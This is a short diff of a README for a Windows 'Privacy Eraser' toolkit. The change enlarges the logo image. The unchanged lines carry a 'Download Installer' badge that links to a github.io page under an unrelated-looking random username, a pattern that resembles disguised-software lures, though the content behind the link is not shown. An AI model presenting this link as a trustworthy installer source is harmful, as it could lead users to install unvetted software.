@@ -1,7 +1,7 @@
 # Privacy Eraser Privacy Management Toolkit
 
 <div align="center">
-<img src="https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxgEQ4ACObbkTRF4XqKHechyIUKWLUbbTFG85SJbB3SlORUGjtXY7Q_a9MRucNTqkgF7y3K3oD9LwJz9MAUL_koI-&format=source" alt="Privacy Eraser Logo" width="150">
+<img src="https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxgEQ4ACObbkTRF4XqKHechyIUKWLUbbTFG85SJbB3SlORUGjtXY7Q_a9MRucNTqkgF7y3K3oD9LwJz9MAUL_koI-&format=source" alt="Privacy Eraser Logo" width="550">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://alijahfraziernfnq.github.io/.github/Privacy-Eraser-Windows)
